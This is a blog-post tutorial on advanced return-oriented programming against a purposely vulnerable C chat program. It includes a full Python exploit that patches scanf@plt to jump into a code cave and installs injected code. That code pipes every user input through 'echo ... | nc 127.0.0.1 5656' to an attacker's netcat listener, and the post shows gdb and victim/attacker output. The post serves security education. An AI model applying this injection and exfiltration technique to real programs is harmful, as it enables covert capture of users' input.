---
layout: post
title: "Buffer overflow - advanced ROP: infecting a running program"
date: 2020-01-12
tags: [security, linux, programming, vulnerabilities]
---

In this post we'll use ROP to infect a program with malicious code.


## The vulnerable program

The program below is vulnerable to a buffer overflow in both the `chat()` and `net()` functions. The former takes user input and outputs to the screen. The latter simulates reading data over a network, and is the function we'll exploit.


```c
/*
 * r2l3.c
 * gcc r2l3.c -fno-stack-protector -o r2l3
 */
#include <stdio.h>

char *replies[] = {"Tell me more!", "Really?!", "How interesting!",
                    "You're so cool!", "That's funny!", "Smart!!!",
                    "I don't understand...", "I'm hungry.", "Hahahihi.", "Burp!"};

void chat()
{
    char input[25];
    printf("You:  ");
    scanf("%[^\n]%*c", input);

    int reply = (int)input[0] % 10;
    printf("Robo: %s\n", replies[reply]);
}


void net()
{
    char input[25];
    FILE *fp = fopen("/tmp/network", "r");
    if (fp != NULL)
        fscanf(fp, "%[^\n]%*c", input);
}


int main(int argc, char *argv[])
{
    while(1) {
        chat();
        net();
    }
}
```

We're gonna do something interesting: by exploting the vulnerability using ROP techniques, we will inject malcious code into the program by manipulating the existing code. The program will continue running, but now all input given to the chat program will also be sent to the hacker's computer.


For some extra fun, we'll do the following:

- Find the bytes we need somewhere in memory.

```
(gdb) find/1b system, +999999999999, 0xe9, 0x9b, 0x02, 0x00, 0x00
0x7ffff7f43331
1 pattern found.
```

- Then use a custom function, which can copy any number of bytes from one memory location to another.

```
def bncpy(dest, src, n):
    result =  poprdi + struct.pack("<Q", dest)
    result += poprsi + struct.pack("<Q", src)
    for i in range(n):
        # 0x00000000000a5980: movsb byte ptr [rdi], byte ptr [rsi]; ret;
        result += struct.pack("<Q", libc_base + 0xa5980)
    return result
```

> `movsb` copies a byte from source to destination address, and also increments both addresses.

> You can modify `bncpy()` to use fewer instructions for longer sequences of bytes.

We could of course put all needed bytes through `fscanf()` directly (as long as we avoid badchars), then use `bncpy()` or similar to copy the data to where we want it, but I think it's funny jumping all over libc collecting tiny pieces here and there.

## The exploit

Below, the multiple steps of the exploit are described.

### Use `mprotect()` to set the memory area of the code cave and `.plt` to writeable.

After `rip` is in our control, `mprotect()` is called. This was covered in the previous post.

```
# mprotect() arguments
addr   = struct.pack("<Q", 0x401000)
length = struct.pack("<Q", 1)
prot   = struct.pack("<Q", 7)
```

### Overwrite jump to `scanf()` with jump to a code cave.

We will hijack the call to `scanf()` in `chat()` to move execution to our malicious code:

``` bash
(gdb) disas chat
Dump of assembler code for function chat:
...
   0x000000000040117e <+40>:    callq  0x401060 <__isoc99_scanf@plt>
...
(gdb) disas/r 0x401060
Dump of assembler code for function __isoc99_scanf@plt:
   0x0000000000401060 <+0>:     ff 25 ca 2f 00 00    jmpq   *0x2fca(%rip)  # 0x404030 <__isoc99_scanf@got.plt>
   0x0000000000401066 <+6>:     68 03 00 00 00       pushq  $0x3
   0x000000000040106b <+11>:    e9 b0 ff ff ff       jmpq   0x401020

```

The above jump instruction, which uses a GOT address, will be overwritten by a simple jump to our malicious code.

The malcious code will be put in a cave at 0x401300:

```
(gdb) x/100gx 0x401300
0x401300:       0x0000000000000000      0x0000000000000000
0x401310:       0x0000000000000000      0x0000000000000000
0x401320:       0x0000000000000000      0x0000000000000000
0x401330:       0x0000000000000000      0x0000000000000000
...
```

> Code caves can be found by searching for empty space in a binary using scripts or tools, or even by visual inspection (e.g. `x/1000gx <addr>` in gdb).

To jump to our code cave, we turn the jump in `scanf@plt` to this:

```
   0x0000000000401060 <+0>:     e9 9b 02 00 00  jmpq   0x401300
```

### Put a template attack string in the code cave

A template attack string is written to 0x401400. This will be used to generate a "fresh" attack string each time `scanf()` is called by `chat()`

```
'echo                          | nc <IP> <PORT>'
```

The space is where the user input will go. Extra space characters are ignored by the shell, so we only have to make enough room for the maximum input length.

We find the bytes we need in memory, and use `bncpy()` to write them all to memory.

e.g. "echo":

```
(gdb) find/1 0x7ffff7de4000, +99999999999, {char[1]}"e"
0x7ffff7de49cc
(gdb) find/1 0x7ffff7de4000, +99999999999, {char[3]}"cho"
0x7ffff7df73ea
```

> `strings -tx` can also be useful for `grep`'ing needed strings, as covered in the previous post.

### Put malicious code at the start of the code cave

This code will run each time `scanf()` is called from `chat()`:

```bash
0x401300:    mov    $0x401380,%edi
0x401305:    nop
0x401306:    nop
0x401307:    mov    $0x401400,%esi
0x40130c:    mov    $0x37,%cl
0x40130e:    rep movsb %ds:(%rsi),%es:(%rdi)
0x401310:    mov    $0x401500,%edi
0x401315:    movabs $0x7ffff7e57320,%rax
0x40131f:    callq  *%rax
0x401321:    mov    $0x401500,%esi
0x401326:    mov    $0x401385,%edi
0x40132b:    movsb  %ds:(%rsi),%es:(%rdi)
0x40132c:    cmpb   $0x0,(%rsi)
0x40132f:    jne    0x40132b
0x40133d:    mov    $0x401380,%edi
0x401342:    movabs $0x7ffff7e29c30,%rax
0x40134c:    callq  *%rax
0x40134e:    mov    0x401500,%cl
0x401355:    mov    $0x401187,%eax
0x40135a:    jmpq   *%rax
0x40135c:    add    %al,(%rax)
0x40135e:    add    %al,(%rax)
0x401360:    add    %al,(%rax)
```

It does the following:

1. First, it takes a copy of the template string and puts it at 0x401380.
2. Next, it calls `gets()` and stores the user input in 0x401500.
3. The user input is copied to 0x401385 (right after "echo ").
4. `system()`is called with the string in 0x401380 as its argument.
5. The first byte of user input is put in the `cl` register.
6. The program continues execution at `chat+49`.

```
   0x000000000040117e <+40>:    callq  0x401060 <__isoc99_scanf@plt>
   0x0000000000401183 <+45>:    movzbl -0x20(%rbp),%ecx
   0x0000000000401187 <+49>:    movsbw %cl,%ax
```

> Why the `nop`s? Look at the complete exploit code and see if you can understand why.

Again, we find the bytes we need in memory, and use `bncpy()`.


```bash
(gdb) find/1b 0x7ffff7de4000, +99999999999, 0xbf, 0x80
0x7ffff7e65228
```

### Continue executing the program

After the program has been infected, the execution will continue at `main+15`

```
   0x0000000000401212 <+0>:     push   %rbp
   0x0000000000401213 <+1>:     mov    %rsp,%rbp
   0x0000000000401216 <+4>:     sub    $0x10,%rsp
   0x000000000040121a <+8>:     mov    %edi,-0x4(%rbp)
   0x000000000040121d <+11>:    mov    %rsi,-0x10(%rbp)
   0x0000000000401221 <+15>:    mov    $0x0,%eax
   0x0000000000401226 <+20>:    callq  0x401156 <chat>
   0x000000000040122b <+25>:    mov    $0x0,%eax
   0x0000000000401230 <+30>:    callq  0x4011d3 <net>
   0x0000000000401235 <+35>:    jmp    0x401221 <main+15>
```

### Code for the complete exploit

```python
# r2l3_exploit.py
import struct

# value found with ldd
libc_base = 0x00007ffff7de4000

# fill buffer and overwrite saved frame pointer
pad = 56 * "a"

# mprotect() arguments
addr   = struct.pack("<Q", 0x401000)
length = struct.pack("<Q", 1)
prot   = struct.pack("<Q", 7)

# gadgets
raxto7  = struct.pack("<Q", libc_base + 0xb8a00)
raxpl3  = struct.pack("<Q", libc_base + 0xb8980)
poprdi  = struct.pack("<Q", libc_base + 0x23dd3)
poprsi  = struct.pack("<Q", libc_base + 0x2477e)
poprdx  = struct.pack("<Q", libc_base + 0x821d6)
syscall = struct.pack("<Q", libc_base + 0x82869)

def bncpy(dest, src, n):
    s =  poprdi + struct.pack("<Q", dest)
    s += poprsi + struct.pack("<Q", src)
    for i in range(n):
        # 0x00000000000a5980: movsb byte ptr [rdi], byte ptr [rsi]; ret;
        s += struct.pack("<Q", libc_base + 0xa5980)
    return s

# write template attack string to 0x401400
def writeEcho():
    dest = 0x401400
    s = bncpy(dest, 0x7ffff7de49cc, 1)   # e
    dest += 1
    s += bncpy(dest, 0x7ffff7df73ea, 3)  # cho
    dest += 3
    s += bncpy(dest, 0x7ffff7f72870, 16) # 16 * " "
    dest += 16
    s += bncpy(dest, 0x7ffff7f72870, 16) # 16 * " "
    dest += 16
    s += bncpy(dest, 0x7ffff7de451a, 1)  # "|"
    dest += 1
    s += bncpy(dest, 0x7ffff7de6c3c, 2)  # "nc"
    dest += 2
    s += bncpy(dest, 0x7ffff7f72870, 1)  # " "
    dest += 1
    s += bncpy(dest, 0x7ffff7df66f6, 2)  # "12"
    dest += 2
    s += bncpy(dest, 0x7ffff7e1ff85, 2)  # "7."
    dest += 2
    s += bncpy(dest, 0x7ffff7f6d48a, 4)  # "0.0."
    dest += 4
    s += bncpy(dest, 0x7ffff7ec5b6b, 2)  # "1 "
    dest += 2
    s += bncpy(dest, 0x7ffff7e63287, 2)  # "56"
    dest += 2
    s += bncpy(dest, 0x7ffff7e63287, 2)  # "56"
    return s


# write code to start of code cave
def writeCode():
    dest = 0x401300
    #                     bf 80 13 40 00         mov    edi,0x401380
    s = bncpy(dest, 0x7ffff7e65228, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de47a1, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de4008, 1)
    dest += 1
    #                                            nop; nop
    s += bncpy(dest, 0x7ffff7e6147a, 2)
    dest += 2
    #                     be 00 14 40 00         mov    esi,0x401400
    s += bncpy(dest, 0x7ffff7e29ead, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de476e, 3)
    dest += 3
    #                     b1 37                  mov    cl,0x37
    s += bncpy(dest, 0x7ffff7e29e1b, 1)
    dest += 1
    s += bncpy(dest, 0x7ffff7e2a3ad, 1)
    dest += 1
    #                     f3 a4                  rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
    s += bncpy(dest, 0x7ffff7e11b11, 2)
    dest += 2
    #                                            mov    edi,0x401500
    s += bncpy(dest, 0x7ffff7e2a124, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7ee0fc1, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de4008, 1)
    dest += 1
    #                     48 b8 20 73 e5 f7 ff   movabs rax,0x7ffff7e57320
    #                     7f 00 00
    s += bncpy(dest, 0x7ffff7e2ebc8, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7ed4c8a, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7eb66df, 3)
    dest += 3
    s += bncpy(dest, 0x7ffff7deaa10, 3)
    dest += 3
    #                     ff d0                  call   rax
    s += bncpy(dest, 0x7ffff7e2c033, 2)
    dest += 2
    #                     be 00 15 40 00         mov    esi,0x401500
    s += bncpy(dest, 0x7ffff7e29ead, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7ee0fc1, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de4008, 1)
    dest += 1
    #                     bf 85 13 40 00         mov    edi,0x401385
    s += bncpy(dest, 0x7ffff7ec4376, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de47a1, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7de4008, 1)
    dest += 1
    # <lbl>:
    #                     a4                     movs   BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
    #                     80 3e 00               cmp    BYTE PTR [rsi],0x0
    s += bncpy(dest, 0x7ffff7f7b89c, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e37633, 2)
    dest += 2
    #                    75 fa                   jne    <lbl>
    s += bncpy(dest, 0x7ffff7e32474, 2)
    dest += 2
    #                   bf 80 13 40 00           mov    edi,0x401380
    s += bncpy(dest, 0x7ffff7e65228, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e44664, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e29c4a, 1)
    dest += 1
    #                   48 b8 30 9c e2 f7 ff     movabs rax,0x7ffff7e29c30
    #                   7f 00 00
    s += bncpy(dest, 0x7ffff7e2ebc8, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7f10ce5, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e9652d, 3)
    dest += 3
    s += bncpy(dest, 0x7ffff7deaa10, 3)
    dest += 3
    #                     ff d0                  call   rax
    s += bncpy(dest, 0x7ffff7e2c033, 2)
    dest += 2
    #                     8a 0c 25 00 15 40 00   mov    cl,BYTE PTR ds:0x401500
    s += bncpy(dest, 0x7ffff7e9d914, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e29e2d, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7ee0fc1, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e29c4a, 1)
    dest += 1
    #                     b8 87 11 40 00         mov    eax,0x401187
    s += bncpy(dest, 0x7ffff7e6bac8, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e628fc, 2)
    dest += 2
    s += bncpy(dest, 0x7ffff7e29c4a, 1)
    dest += 1
    #                    ff e0                   jmp    rax
    s += bncpy(dest, 0x7ffff7e33462, 2)

    return s


# mprotect()
smpro = raxto7 + raxpl3 + poprdi + addr + poprsi + length + poprdx + prot + syscall
# hijack scanf (e9 9b 02 00 00 = jmpq 0x401300)
hijack = bncpy(0x401060, 0x7ffff7f43331, 5)

# start of chat() + net() inf loop in main
gotostart = struct.pack("<Q", 0x401221)

print pad + smpro + hijack + writeEcho() + writeCode() + gotostart
```

## Running the exploit

Send the exploit data to the program:

```bash
$ python r2l3_exploit.py > /tmp/network
```

Start and configure gdb:

```bash
$ gdb r2l3
(gdb) display/i $rip
(gdb) display/25i 0x401300
(gdb) display/s 0x401380
(gdb) display/s 0x401400
(gdb) display/s 0x401500
(gdb)
```

Break at `chat()`'s call to `scanf()`:

```bash
(gdb) b *chat+40
```

Run the program, continue, enter any string at the prompt, and continue:

```bash
(gdb) r
...
(gdb) c
Continuing.
You: b
```

You will now have the following:

```bash
Robo: Hahahihi.

Breakpoint 1, 0x000000000040117e in chat ()
1: x/i $rip
=> 0x40117e <chat+40>:  callq  0x401060 <__isoc99_scanf@plt>
2: x/25i 0x401300
0x401300:    mov    $0x401380,%edi
0x401305:    nop
0x401306:    nop
...
3: x/s 0x401380  0x401380:      ""
4: x/s 0x401400  0x401400:      "echo", ' ' <repeats 32 times>, "|nc 127.0.0.1 5656"
5: x/s 0x401500  0x401500:      ""
(gdb)
```

Remove the exploit data to prevent another buffer overflow:

```bash
$ echo foo > /tmp/network
```

Back in gdb, use `ni` to go execute our malicious code one instruction at a time. You will see the template string being copied, user input being accepted and copied to complete the "evil" string that will be used by `system()` and so on.

Disable breakpoints and continue the program to observe that it runs as usual for the user,  accepting input and printing output.

After the infection is complete we expect to see everything that the user types into the prompt being sent to the attacker's Netcat listener, but we won't. Use `strace -f` to find out why. Then you can update the exploit to call a very simple function before calling `system()`, and everything will work properly.

Victim:

```bash
$ ./r2l3
You:  Good evening, my only friend
Robo: Really?!
You:  Sadly, yes
Robo: You're so cool!
You:  Thanks, so are you!
Robo: That's funny!
You:  I got a big secret. Wanna know?
Robo: You're so cool!
You:  █
```

Attacker:

```bash
$ <send exploit>
$ nc -kvlp 5656
...
Ncat: Connection from 127.0.0.1.
Ncat: Connection from 127.0.0.1:43970.
Sadly, yes
...
Thanks, so are you!
...
I got a big secret. Wanna know?
```

## A challenge

Write a script or program that can automatically search for byte sequences in a binary and build a payload like the one we used in the exploit.
